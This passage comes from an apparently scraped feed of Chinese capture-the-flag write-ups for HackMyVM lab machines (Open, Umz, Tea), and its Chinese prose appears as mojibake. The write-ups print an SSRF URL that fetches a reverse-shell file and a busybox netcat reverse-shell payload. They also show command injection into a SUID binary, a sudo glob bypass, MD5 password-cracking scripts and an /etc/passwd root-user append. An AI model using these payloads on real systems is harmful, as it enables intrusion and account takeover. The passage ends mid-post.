3.  ÊûÑÈÄ†ÊÅ∂ÊÑèÁöÑ URLÔºåÂà©Áî® `@` Á¨¶Âè∑ÁªïËøá‰∏ªÊú∫È™åËØÅÔºåÂπ∂ÊåáÂêëÊîªÂáªÊú∫‰∏äÁöÑÂèçÂºπ shell Êñá‰ª∂„ÄÇ
4.  Âú® Kali ‰∏äÂºÄÂêØ `netcat` ÁõëÂê¨„ÄÇ

**ÊÅ∂ÊÑè URL:**
```
http://open.dsz/?url=http://open.dsz@192.168.205.128/reverse.php
```

ËÆøÈóÆ‰∏äËø∞ URL ÂêéÔºåÊàêÂäüÂú®Êú¨Âú∞ `netcat` ÁõëÂê¨Âô®‰∏äÊé•Êî∂Âà∞‰∫ÜÊù•Ëá™ÁõÆÊ†áÊúçÂä°Âô®ÁöÑ `www-data` Áî®Êà∑ÂèçÂºπ shell„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nc -lvnp 8888       
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.239] 45778
...
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# **‰∏â„ÄÅÊùÉÈôêÊèêÂçá**

## 1. ‰ªé `www-data` Âà∞ `miao`

Ëé∑ÂèñÂàùÂßã shell ÂêéÔºåÂú® `/home` ÁõÆÂΩï‰∏ãÂèëÁé∞‰∫Ü `giao`, `miao`, `xiao` ‰∏â‰∏™Áî®Êà∑„ÄÇÂú® `/opt` ÁõÆÂΩï‰∏≠ÔºåÂèëÁé∞‰∫Ü‰∏Ä‰∏™ÂÖ∑Êúâ SUID ÊùÉÈôêÁöÑÂèØÊâßË°åÊñá‰ª∂ `echo`„ÄÇ

```bash
www-data@Open:/opt$ ls -al
...
-rwsr-sr-x  1 root root 17008 Jul 29 03:06 echo
...
```

ÈÄöËøáÈÄÜÂêëÂàÜÊûê`echo` Êñá‰ª∂ÔºåÂèëÁé∞ÂÆÉÂ≠òÂú®ÂëΩ‰ª§Ê≥®ÂÖ•ÊºèÊ¥û„ÄÇ

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char v4[2]; // [rsp+1Eh] [rbp-232h] BYREF
  _QWORD v5[2]; // [rsp+20h] [rbp-230h] BYREF
  int v6; // [rsp+30h] [rbp-220h]
  char v7[8]; // [rsp+34h] [rbp-21Ch] BYREF
  char dest[524]; // [rsp+40h] [rbp-210h] BYREF
  int v9; // [rsp+24Ch] [rbp-4h]

  if ( setgid(0x3E8u) || setuid(0x3E8u) )
  {
    fwrite('ÈèâÂÜÆÊ™∫ÁíÅÂâßÁñÜÊæ∂Ëæ´Ëß¶\n', 1uLL, 0x13uLL, stderr);
    return 1;
  }
  else if ( argc &gt; 1 )
  {
    v5[0] = 0xE75B27206F686365LL;
    v5[1] = 0x93BEE8B788E6A894LL;
    v6 = 1571128805;
    strcpy(v7, ': ');
    strcpy(v4, ''');
    strcpy(dest, (const char *)v5);
    strcat(dest, argv[1]);
    strcat(dest, v4);
    printf(asc_2047, dest);
    v9 = system(dest);
    if ( v9 == -1 )
    {
      perror(s);
      return 1;
    }
    else
    {
      return 0;
    }
  }
  else
  {
    printf('Êµ£Ë∑®Êï§ÈèÇËßÑÁ°∂: %s \'Áëï‰Ω∏Ê¥ñÈèÑÂâßÊÆëÂ®ëÂ†ü‰ºÖ\'\n', *argv);
    return 1;
  }
}
```

ËØ•Á®ãÂ∫è‰ºöÂ∞ÜÂÖ∂Ëé∑ÂèñÁöÑÂëΩ‰ª§Ë°åÂèÇÊï∞Áõ¥Êé•ÊãºÊé•Âà∞‰∏Ä‰∏™Á≥ªÁªüÂëΩ‰ª§Â≠óÁ¨¶‰∏≤‰∏≠Âπ∂ÊâßË°åÔºåÂπ∂‰∏î‰ºö‰ª•Áî®Êà∑ `miao` (UID 1000) ÁöÑÊùÉÈôêËøêË°å„ÄÇ

Âà©Áî®Ê≠§ÊºèÊ¥ûÔºåÈÄöËøáÊ≥®ÂÖ• `bash -p` ÂëΩ‰ª§ÔºåÊàë‰ª¨ÊàêÂäüËé∑Âæó‰∫Ü‰∏Ä‰∏™Êã•Êúâ `miao` Áî®Êà∑ÊùÉÈôêÁöÑ shell„ÄÇ

```bash
www-data@Open:/opt$ ./echo ''; id; whoami #'
ÊâßË°åÂëΩ‰ª§: echo '[Áî®Êà∑ËæìÂÖ•]: '; id; whoami #'
[Áî®Êà∑ËæìÂÖ•]: 
uid=1000(miao) gid=1000(miao) groups=1000(miao),33(www-data)
miao

www-data@Open:/opt$ ./echo ''; bash -p #'
ÊâßË°åÂëΩ‰ª§: echo '[Áî®Êà∑ËæìÂÖ•]: '; bash -p #'
[Áî®Êà∑ËæìÂÖ•]: 
miao@Open:/opt$ id
uid=1000(miao) gid=1000(miao) groups=1000(miao),33(www-data)
```

ÂêåÊó∂ÔºåÂú® `miao` ÁöÑÂÆ∂ÁõÆÂΩï‰∏ãÔºåÊâæÂà∞‰∫ÜÁ¨¨‰∏Ä‰∏™ flag Êñá‰ª∂ `user.txt`„ÄÇ

```bash
miao@Open:/opt$ cat /home/miao/user.txt 
flag{user-b026324c6904b2a9cb4b88d6d61c81d1}
```

#### 2. ‰ªé `miao` Âà∞ `root`

Êàê‰∏∫ `miao` Áî®Êà∑ÂêéÔºåÊâßË°å `sudo -l` ÂèëÁé∞ËØ•Áî®Êà∑ÂèØ‰ª•Êó†ÂØÜÁ†ÅÊâßË°å `/opt/hello.sh` ËÑöÊú¨„ÄÇ

```bash
miao@Open:/opt$ sudo -l
...
User miao may run the following commands on Open:
    (ALL) NOPASSWD: /opt/hello.sh
```

Êü•ÁúãËØ•ËÑöÊú¨ÂÜÖÂÆπÔºåÂèëÁé∞ÂÆÉÂØπËæìÂÖ•ÂèÇÊï∞ 'dsz' ÂÅö‰∫ÜÂà§Êñ≠„ÄÇÂ¶ÇÊûúÂèÇÊï∞ÂÆåÂÖ®Á≠â‰∫é 'dsz'ÔºåËÑöÊú¨‰ºöÁõ¥Êé•ÈÄÄÂá∫„ÄÇÁÑ∂ËÄåÔºåËÑöÊú¨‰ΩøÁî®‰∫Ü `[ $1 = 'dsz' ]` ËøôÁßç‰∏ç‰∏•Ë∞®ÁöÑÂà§Êñ≠ÊñπÂºè„ÄÇ

```bash
miao@Open:/opt$ cat hello.sh 
PATH=/usr/bin
[ -n '$1' ] || exit 1
[ '$1' = 'dsz' ] &amp;&amp; exit 2
#[ $1 = 'dsz' ] &amp;&amp; cat /root/password.txt | md5sum | awk '{print $1}'
[ $1 = 'dsz' ] &amp;&amp; cat /root/password.txt
echo 'Goodbye!'
```

Êàë‰ª¨ÂèØ‰ª•ÈÄöËøá `bash` ÁöÑÈÄöÈÖçÁ¨¶Êâ©Â±ïÔºàglobbingÔºâÊù•ÁªïËøáËøô‰∏™Ê£ÄÊü•„ÄÇ
1.  Âú® `/tmp` ÁõÆÂΩï‰∏ãÂàõÂª∫‰∏Ä‰∏™Âêç‰∏∫ `'dsz '`ÔºàÊ≥®ÊÑèÊú´Â∞æÊúâÁ©∫Ê†ºÔºâÁöÑÊñá‰ª∂„ÄÇ
2.  ÊâßË°å `sudo /opt/hello.sh *`ÔºåÊ≠§Êó∂ `*` ‰ºöË¢´ shell Êâ©Â±ï‰∏∫Êñá‰ª∂Âêç `'dsz '`Ôºå‰ªéËÄåÁªïËøá‰∫Ü `[ '$1' = 'dsz' ]` ÁöÑÊ£ÄÊü•ÔºåÂπ∂ÊàêÂäüÊâßË°å‰∫Ü `cat /root/password.txt` ÂëΩ‰ª§„ÄÇ

```bash
miao@Open:/tmp$ touch 'dsz '
miao@Open:/tmp$ sudo /opt/hello.sh *
6cd1f22e65d26246530ff7a2528144e3
Goodbye!
```

Êàë‰ª¨ÂæóÂà∞‰∫Ü‰∏Ä‰∏™ MD5 ÂìàÂ∏å„ÄÇÂÄºÂæóÊ≥®ÊÑèÁöÑÊòØÔºåËÑöÊú¨‰∏≠Ëé∑ÂèñÂìàÂ∏åÁöÑÊñπÂºèÊòØ `cat /root/password.txt | md5sum`ÔºåËøôÊÑèÂë≥ÁùÄË¢´ÂìàÂ∏åÁöÑÂéüÂßãÂØÜÁ†ÅÂ≠óÁ¨¶‰∏≤Êú´Â∞æ‰ºöÂåÖÂê´‰∏Ä‰∏™Êç¢Ë°åÁ¨¶ (`\n`)„ÄÇ

‰ΩøÁî®Ëá™ÂÆö‰πâÁöÑ Python ËÑöÊú¨ÔºåÈíàÂØπÂåÖÂê´Êç¢Ë°åÁ¨¶ÁöÑÂØÜÁ†ÅËøõË°åÁàÜÁ†¥ÔºåÊúÄÁªàÊàêÂäüÁ†¥Ëß£Âá∫ `root` Áî®Êà∑ÁöÑÂØÜÁ†Å‰∏∫ `do167watt041`„ÄÇ

```python
import threading
import hashlib

f = '/usr/share/wordlists/rockyou.txt'
h = '6cd1f22e65d26246530ff7a2528144e3'
fnd = False
thd = 1000  

def md5chk(w):
    global fnd
    if fnd:
        return
    m = hashlib.md5(w).hexdigest()
    if m == h:
        with threading.Lock():
            if not fnd:
                fnd = True
                print(f'\n[+] ÂëΩ‰∏≠: {w.decode().strip()}')
        exit()


with open(f, 'rb') as fd:
    lines = fd.readlines()

print('ÁàÜÁ†¥‰∏≠...')

def worker(line):
    global fnd
    if not fnd:
        md5chk(line)

ts = []
for line in lines:
    if fnd:
        break
    
    while threading.active_count() &gt; thd:
        pass
    t = threading.Thread(target=worker, args=(line,))
    t.start()
    ts.append(t)


for t in ts:
    t.join()

if not fnd:
    print('\n[-] Êú™ÊâæÂà∞ÂåπÈÖçÈ°π')
```

‰ΩøÁî®ËØ•ÂØÜÁ†ÅÊàêÂäüÂàáÊç¢Âà∞ `root` Áî®Êà∑„ÄÇ

```bash
miao@Open:/tmp$ su -
Password: do167watt041
root@Open:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### **Âõõ„ÄÅÂ§∫ÂèñÊóóÂ∏ú**

Ëé∑Âèñ root ÊùÉÈôêÂêéÔºåËØªÂèñÊâÄÊúâÊóóÂ∏úÊñá‰ª∂„ÄÇ

```bash
root@Open:~# cat /home/miao/user.txt 
flag{user-b026324c6904b2a9cb4b88d6d61c81d1}

root@Open:~# cat /root/root.txt 
flag{root-6cd1f22e65d26246530ff7a2528144e3}
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Open.html</guid><pubDate>Wed, 06 Aug 2025 00:51:37 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_umz</title><link>https://7r1UMPHK.github.io/post/nei-bu-_umz.html</link><description>Èù∂Êú∫Âú∞ÂùÄÔºöhttps://hackmyvm.eu/machines/machine.php?vm=Umz

![image-20250804203716777](http://7r1UMPHK.github.io/image/20250804203743076.webp)

# **‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ**

## 1. ‰∏ªÊú∫ÂèëÁé∞

È¶ñÂÖàÔºåÂú®Êú¨Âú∞ÁΩëÁªú‰∏≠‰ΩøÁî® `arp-scan` Â∑•ÂÖ∑Êâ´ÊèèÂ≠òÊ¥ª‰∏ªÊú∫ÔºåÁ°ÆÂÆöÁõÆÊ†áÈù∂Êú∫ÁöÑ IP Âú∞ÂùÄ‰∏∫ `192.168.205.243`„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ sudo arp-scan -l
...
192.168.205.243 08:00:27:9a:39:0d       PCS Systemtechnik GmbH
...
```

## 2. Á´ØÂè£‰∏éÊúçÂä°Êâ´Êèè

‰ΩøÁî® `nmap` ÂØπÁõÆÊ†á‰∏ªÊú∫ËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÔºåÂèëÁé∞ÂÖ∂ÂàùÂßãÂºÄÊîæ‰∫Ü 22 (SSH) Âíå 80 (HTTP) ‰∏§‰∏™Á´ØÂè£„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ nmap -p- 192.168.205.243
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-04 08:37 EDT
Nmap scan report for 192.168.205.243
Host is up (0.000099s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

## 3. Web ÊúçÂä°Êé¢Á¥¢

ËÆøÈóÆ 80 Á´ØÂè£ÊòØ‰∏Ä‰∏™ÈùôÊÄÅÁΩëÈ°µ„ÄÇ

![image-20250804203832718](http://7r1UMPHK.github.io/image/20250804203833086.webp)

ËøôË¥¥ËÑ∏ÂºÄÂ§ßÔºåÂò≤ËÆΩÊàë‰ª¨ddos‰∏çË°åÁöÑÔºåÂ∞±Êª°Ë∂≥‰ªñ

```
gobuster dir -k -t 200000 -u http://192.168.205.243 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip
```

Êâ´Êèè‰∏ÄÊ≥¢Â∞±ÊåÇ‰∫Ü„ÄÇ

ÈáçÊñ∞ËøõË°åÁ´ØÂè£Êâ´ÊèèÂèëÁé∞ÔºåÊúçÂä°Á´ØÂè£Â∑≤‰ªé 80 ÂàáÊç¢Âà∞‰∫Ü 8080„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ nmap -p- 192.168.205.243
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-04 08:40 EDT
Nmap scan report for 192.168.205.243
Host is up (0.000089s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
```

ËÆøÈóÆ `http://192.168.205.243:8080`ÔºåÂèëÁé∞‰∏Ä‰∏™ÁôªÂΩïÈ°µÈù¢„ÄÇ

# **‰∫å„ÄÅÂàùÂßãËÆøÈóÆ**

## 1. ÊºèÊ¥ûÂà©Áî®

Â∞ùËØï‰ΩøÁî®Âº±Âè£‰ª§ `admin:admin` ÊàêÂäüÁôªÂΩïÂêéÂè∞„ÄÇÂêéÂè∞Êèê‰æõ‰∏Ä‰∏™ `ping` ÂäüËÉΩÔºåÊµãËØïÂèëÁé∞Â≠òÂú®ÂëΩ‰ª§Ê≥®ÂÖ•ÊºèÊ¥û„ÄÇÈÄöËøá‰ΩøÁî®ÂàÜÂè∑ `;` ÂèØ‰ª•ÊãºÊé•Âπ∂ÊâßË°å‰ªªÊÑèÁ≥ªÁªüÂëΩ‰ª§„ÄÇ

```text
Payload: ; id
```

## 2. Ëé∑Âèñ Shell

Âà©Áî®ËØ•ÂëΩ‰ª§Ê≥®ÂÖ•ÊºèÊ¥ûÔºåÊâßË°åÂèçÂêë Shell ÂëΩ‰ª§ÔºåÊàêÂäüÂú®Êú¨Âú∞ Kali ÁõëÂê¨ÁöÑÁ´ØÂè£‰∏äÊé•Êî∂Âà∞ Shell„ÄÇ

*   **ÊîªÂáªÊú∫ÔºàKaliÔºâÁõëÂê¨:**
    ```bash
    ‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
    ‚îî‚îÄ$ nc -lvnp 8888
    listening on [any] 8888 ...
    ```

*   **Web È°µÈù¢Ê≥®ÂÖ• Payload:**
    ```text
    ;busybox nc 192.168.205.128 8888 -e /bin/bash
    ```

ÊàêÂäüËé∑Âèñ `welcome` Áî®Êà∑ÁöÑ Shell„ÄÇ‰∏∫Êñπ‰æøÂêéÁª≠Êìç‰ΩúÔºå‰ΩøÁî® `stty` Â∞ÜÂÖ∂ÂçáÁ∫ß‰∏∫ÂäüËÉΩÂÆåÊï¥ÁöÑ‰∫§‰∫íÂºè TTY„ÄÇ

```bash
# Á®≥ÂÆö Shell
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 34 columns 120
```

ËøõÂÖ• `welcome` Áî®Êà∑ÂÆ∂ÁõÆÂΩïÔºåËØªÂèñÁ¨¨‰∏Ä‰∏™ flag„ÄÇ

```bash
welcome@Umz:~$ cat /home/welcome/user.txt
flag{user-4483f72525b3c316704cf126bec02d5c}
```

# **‰∏â„ÄÅÊùÉÈôêÊèêÂçá**

## 1. Ê®™ÂêëÁßªÂä®: welcome -&gt; umzyyds

È¶ñÂÖàÔºåÊ£ÄÊü•ÂΩìÂâçÁî®Êà∑ÁöÑ `sudo` ÊùÉÈôêÔºåÂèëÁé∞ `welcome` Áî®Êà∑ÂèØ‰ª•ÂÖçÂØÜÊâßË°å `/usr/bin/md5sum`„ÄÇ

```bash
welcome@Umz:~$ sudo -l
User welcome may run the following commands on Umz:
    (ALL) NOPASSWD: /usr/bin/md5sum
```

Âú®Á≥ªÁªü‰∏≠ËøõË°åÊûö‰∏æÔºå‰∫é `/opt/flask-debug/` ÁõÆÂΩï‰∏ãÂèëÁé∞‰∏Ä‰∏™Âêç‰∏∫ `umz.pass` ÁöÑÊïèÊÑüÊñá‰ª∂„ÄÇ‰ΩøÁî® `sudo` ÊùÉÈôêËØªÂèñÂÖ∂ MD5 ÂìàÂ∏åÂÄº„ÄÇ

```bash
welcome@Umz:/opt/flask-debug$ sudo /usr/bin/md5sum umz.pass
a963fadd7fd379f9bc294ad0ba44f659  umz.pass
```

Â∞ùËØï‰ΩøÁî® `john` ÁàÜÁ†¥ËØ•ÂìàÂ∏åÂÄºÊú™Êûú„ÄÇËÄÉËôëÂà∞ Linux Êñá‰ª∂Â∏∏‰ª•Êç¢Ë°åÁ¨¶ `\n` ÁªìÂ∞æÔºåËøôÂèØËÉΩ‰ºöÂΩ±ÂìçÂìàÂ∏åËÆ°ÁÆó„ÄÇ‰ΩøÁî® `perl` ËÑöÊú¨ÁªìÂêà `rockyou.txt` Â≠óÂÖ∏ÔºåÂú®ËÆ°ÁÆóÂìàÂ∏åÊó∂ÂåÖÂê´Êç¢Ë°åÁ¨¶ÔºåÊàêÂäüÁ†¥Ëß£Âá∫ÂØÜÁ†Å„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ perl -MDigest::MD5=md5_hex -nE 'print $_ if md5_hex($_) eq 'a963fadd7fd379f9bc294ad0ba44f659'' /usr/share/wordlists/rockyou.txt
sunshine3
```

ÂØÜÁ†Å‰∏∫ `sunshine3`„ÄÇÈÄöËøá `ls /home` ÂèëÁé∞Â≠òÂú®Âè¶‰∏Ä‰∏™Áî®Êà∑ `umzyyds`„ÄÇ‰ΩøÁî®Á†¥Ëß£Âá∫ÁöÑÂØÜÁ†ÅÊàêÂäüÂàáÊç¢Âà∞ `umzyyds` Áî®Êà∑„ÄÇ

```bash
welcome@Umz:~$ su umzyyds
Password: sunshine3
umzyyds@Umz:/home/welcome$
```

## 2. ÂûÇÁõ¥ÊèêÂçá: umzyyds -&gt; root

ÂàáÊç¢Âà∞ `umzyyds` Áî®Êà∑ÂêéÔºåÂú®ÂÖ∂ÂÆ∂ÁõÆÂΩï‰∏≠ÂèëÁé∞‰∏Ä‰∏™Êã•Êúâ `SUID` ÊùÉÈôêÁöÑÂèØÊâßË°åÊñá‰ª∂ `Dashazi`„ÄÇ

```bash
umzyyds@Umz:~$ ls -al
...
-rwsr-sr-x 1 root    root    76712 May  3 10:42 Dashazi
...
```

‰ΩøÁî® `strings` ÂëΩ‰ª§ÂàÜÊûêËØ•Êñá‰ª∂ÔºåÂèëÁé∞ÂÖ∂ÂåÖÂê´‰∫ÜÂ§ßÈáè‰∏é `dd` ÂëΩ‰ª§Áõ∏ÂÖ≥ÁöÑÂ≠óÁ¨¶‰∏≤ÔºåÂèØ‰ª•Êñ≠ÂÆö `Dashazi` Â∞±ÊòØ `dd` ÂëΩ‰ª§ÁöÑÂâØÊú¨„ÄÇ

Áî±‰∫éËØ•Êñá‰ª∂ÂÖ∑Êúâ SUID root ÊùÉÈôêÔºå‰ªª‰ΩïÁî®Êà∑ÊâßË°åÂÆÉÊó∂ÈÉΩÂ∞ÜËé∑Âæó root Ë∫´‰ªΩ„ÄÇÊàë‰ª¨ÂèØ‰ª•Âà©Áî®ÂÆÉ‰ª• root ÊùÉÈôêÂÜôÂÖ•Á≥ªÁªüÂÖ≥ÈîÆÊñá‰ª∂ÔºåÂ¶Ç `/etc/passwd`Ôºå‰ªéËÄåÂàõÂª∫‰∏Ä‰∏™Êñ∞ÁöÑ root Áî®Êà∑„ÄÇ

**ÊèêÊùÉÊ≠•È™§:**

1.  ÊûÑÈÄ†‰∏Ä‰∏™Êñ∞ÁöÑÁî®Êà∑Êù°ÁõÆÔºåÁî®Êà∑Âêç‰∏∫ `b`ÔºåÂØÜÁ†Å‰∏∫`abcdefg`ÔºåUID Âíå GID Âùá‰∏∫ `0` (root ÊùÉÈôê)„ÄÇ
2.  ‰ΩøÁî® `echo` ÂíåÁÆ°ÈÅìÔºåÂ∞ÜËØ•Êù°ÁõÆ‰Ωú‰∏∫ `Dashazi` (dd) ÁöÑËæìÂÖ•„ÄÇ
3.  ÊåáÂÆöËæìÂá∫Êñá‰ª∂ (`of`) ‰∏∫ `/etc/passwd`ÔºåÂπ∂‰ΩøÁî® `oflag=append` Âíå `conv=notrunc` ÈÄâÈ°π‰ª•ËøΩÂä†Ê®°ÂºèÂÜôÂÖ•ÔºåÈÅøÂÖçË¶ÜÁõñÂéüÊñá‰ª∂„ÄÇ

```bash
umzyyds@Umz:~$ echo 'b:$1$AydoDDh4$tEky6m30.0nY3HZ8FgoGI0:0:0::/root:/bin/bash' | ./Dashazi of=/etc/passwd conv=notrunc oflag=append
0+1 records in
0+1 records out
37 bytes copied, 0.000106 s, 349 kB/s
```

# **Âõõ„ÄÅÂ§∫ÂèñÊóóÂ∏ú**

ÊàêÂäüÂêë `/etc/passwd` Êñá‰ª∂‰∏≠Ê∑ªÂä†‰∫ÜÊñ∞ÁöÑ root Áî®Êà∑ `hacker` ÂêéÔºåÁõ¥Êé•ÂàáÊç¢Âà∞ËØ•Áî®Êà∑ÔºåÂç≥ÂèØËé∑Âæó root ÊùÉÈôê„ÄÇ

```bash
umzyyds@Umz:~$ su b
Password:
root@Umz:/home/umzyyds# id
uid=0(root) gid=0(root) groups=0(root)
```

ÊúÄÂêéÔºåËØªÂèñ `root.txt` Ëé∑ÂèñÊúÄÁªàÁöÑ flagÔºåÂÆåÊàêÊ∏óÈÄè„ÄÇ

```bash
root@Umz:/home/umzyyds# cat /root/root.txt /home/welcome/user.txt 
flag{root-a73c45107081c08dd4560206b8ef8205}
flag{user-4483f72525b3c316704cf126bec02d5c}
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_umz.html</guid><pubDate>Wed, 06 Aug 2025 00:51:14 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_tea</title><link>https://7r1UMPHK.github.io/post/nei-bu-_tea.html</link><description># **‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ**

## **1. ‰∏ªÊú∫ÂèëÁé∞**

È¶ñÂÖàÔºåÂú®Êú¨Âú∞ÁΩëÁªú‰∏≠‰ΩøÁî® `arp-scan` Â∑•ÂÖ∑Êâ´ÊèèÂ≠òÊ¥ª‰∏ªÊú∫ÔºåÁ°ÆÂÆöÁõÆÊ†áÈù∂Êú∫ÁöÑ IP Âú∞ÂùÄ‰∏∫ `192.168.205.244`„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ sudo arp-scan -l
...
192.168.205.244 08:00:27:9a:e3:28       PCS Systemtechnik GmbH
...
```

## **2. Á´ØÂè£‰∏éÊúçÂä°Êâ´Êèè**

‰ΩøÁî® `nmap` ÂØπÁõÆÊ†á‰∏ªÊú∫ËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÔºåÂèëÁé∞ÂÖ∂ÂºÄÊîæ‰∫Ü 22 (SSH) Âíå 80 (HTTP) ‰∏§‰∏™Á´ØÂè£„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ nmap -p- 192.168.205.244
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-04 09:03 EDT
Nmap scan report for 192.168.205.244
Host is up (0.000099s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

## **3. Web ÊúçÂä°Êé¢Á¥¢**

ËÆøÈóÆ 80 Á´ØÂè£ÔºåÈ°µÈù¢ÊòæÁ§∫‰∏Ä‰∏™ÂüüÂêç `tea.dsz`„ÄÇ

![image-20250804210408103](http://7r1UMPHK.github.io/image/20250804210408386.webp)

‰ΩøÁî® `gobuster` ËøõË°åÁõÆÂΩïÁàÜÁ†¥ÔºåÂèëÁé∞ `/login.php` È°µÈù¢„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ gobuster dir -u http://192.168.205.244 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt
...
/login.php            (Status: 200)
/index.html           (Status: 200)
...
```

ËÆøÈóÆ `http://192.168.205.244/login.php`ÔºåÂèëÁé∞‰∏Ä‰∏™ÁôªÂΩïÈ°µÈù¢ÔºåÊèê‰æõÂ§öÁßçÁôªÂΩïÊñπÂºè„ÄÇ

![image-20250804210613846](http://7r1UMPHK.github.io/image/20250804210614066.webp)

Â∞ùËØï‰∫Ü‰∏Ä‰∏ãÂº±ÂØÜÁ†ÅÔºåÂèëÁé∞`admin:admin`ÂèØ‰ª•ÁôªÂΩï

![image-20250804211131383](http://7r1UMPHK.github.io/image/20250804211131627.webp)

Êèê‰æõ‰∫ÜÂõõ‰∏™Áî®Êà∑ÂêçÔºåÂÖ∂‰∏≠Ââç‰∏â‰∏™ÈÉΩÊòØÂº±ÂØÜÁ†ÅÁöÑÁî®Êà∑ÂêçÔºåÂøΩÁï•„ÄÇlingmjÊòØÁæ§ÊàêÂëòÁöÑÁî®Êà∑ÂêçÔºåÁõÆÊ†áÂ∞±ÊòØ‰ªñ

ÈÇ£Á™ÅÁ†¥ÁÇπÂèØËÉΩÂ∞±Âú®È™åËØÅÁ†ÅÁôªÂΩïÈÇ£‰∫Ü

![image-20250804210629005](http://7r1UMPHK.github.io/image/20250804210629245.webp)

# **‰∫å„ÄÅÂàùÂßãËÆøÈóÆ**

## **1. ÊºèÊ¥ûÂà©Áî®ÔºöÈ™åËØÅÁ†ÅÁàÜÁ†¥**

È°µÈù¢ÊèêÁ§∫ÂèØ‰ª•‰ΩøÁî®ÈÇÆÁÆ±Âíå4‰ΩçÈ™åËØÅÁ†ÅËøõË°åÁôªÂΩï„ÄÇ

*ÔºàÊàë‰ª¨ÁªìÂêà‰∏Ä‰∏ãÂüüÂêçÂíåÊî∂ÈõÜÁöÑÁî®Êà∑ÂêçÔºåÂæóÂà∞‰∫Ülingmj@tea.dszÁöÑÈÇÆÁÆ±Ôºâ*

Âà©Áî®Ê≠§Êú∫Âà∂ÔºåÊàë‰ª¨‰ΩøÁî® Burp Suite ÁöÑ Intruder Ê®°ÂùóÂØπ4‰ΩçÊï∞Â≠óÈ™åËØÅÁ†ÅËøõË°åÁàÜÁ†¥„ÄÇ

*   **Burp Suite ËÆæÁΩÆ**Ôºö
    1.  Êã¶Êà™È™åËØÅÁ†ÅÁôªÂΩïÁöÑ POST ËØ∑Ê±Ç„ÄÇ
    2.  Â∞ÜËØ∑Ê±ÇÂèëÈÄÅÂà∞ Intruder Ê®°Âùó„ÄÇ
    3.  Â∞ÜÈ™åËØÅÁ†ÅÂèÇÊï∞ `code` ËÆæÁΩÆ‰∏∫ÁàÜÁ†¥ÁÇπ„ÄÇ
    4.  ËÆæÁΩÆ Payload ‰∏∫Êï∞Â≠óÂ∫èÂàóÔºåËåÉÂõ¥‰ªé 0000 Âà∞ 9999„ÄÇ

![image-20250804211358010](http://7r1UMPHK.github.io/image/20250804211358352.webp)

ÊàêÂäüÁàÜÁ†¥Âá∫È™åËØÅÁ†Å‰∏∫ `8379`„ÄÇ‰ΩøÁî®ËØ•È™åËØÅÁ†ÅÊàêÂäüÁôªÂΩï„ÄÇ

### **2. Ëé∑Âèñ Shell**

ÁôªÂΩïÂêéÔºåÈ°µÈù¢ÊòæÁ§∫‰∫Ü‰∏â‰∏™Áî®Êà∑ÂêçÔºàBlack, Red, FlowerÔºâÂèäÂÖ∂ÂØπÂ∫îÁöÑ MD5 ÂìàÂ∏åÂØÜÁ†Å„ÄÇ

```text
Black
83796a396478e084663c06aa25425864
Red
d390587c3997d1f6b4e4fe968327e3a2
Flower
3c96be08e8b399d1b990f2f5c4939f8b
```

‰ΩøÁî®Âú®Á∫ø MD5 Ëß£ÂØÜÂ∑•ÂÖ∑ÔºåÊàêÂäüÁ†¥Ëß£Âá∫ÊòéÊñáÂØÜÁ†ÅÔºö

*   `83796a396478e084663c06aa25425864` -&gt; `1234hak54321`
*   `d390587c3997d1f6b4e4fe968327e3a2` -&gt; `123bugme`
*   `3c96be08e8b399d1b990f2f5c4939f8b` -&gt; `Cartman`

Â∞ùËØï‰ΩøÁî®Ëøô‰∫õÂá≠ÊçÆÈÄöËøá SSH ÁôªÂΩï„ÄÇÁî®Êà∑ `black` ÂíåÂØÜÁ†Å `1234hak54321` ÁôªÂΩïÊàêÂäü„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ ssh black@192.168.205.244
black@192.168.205.244's password:
...
black@Tea:~$ id
uid=1000(black) gid=1000(black) groups=1000(black)
```

ÁôªÂΩïÂêéÔºåÂú® `/home/red/` ÁõÆÂΩï‰∏ãÂèëÁé∞ `user.txt` Êñá‰ª∂ÔºåÂπ∂ÊàêÂäüËØªÂèñÁ¨¨‰∏Ä‰∏™ flag„ÄÇ

```bash
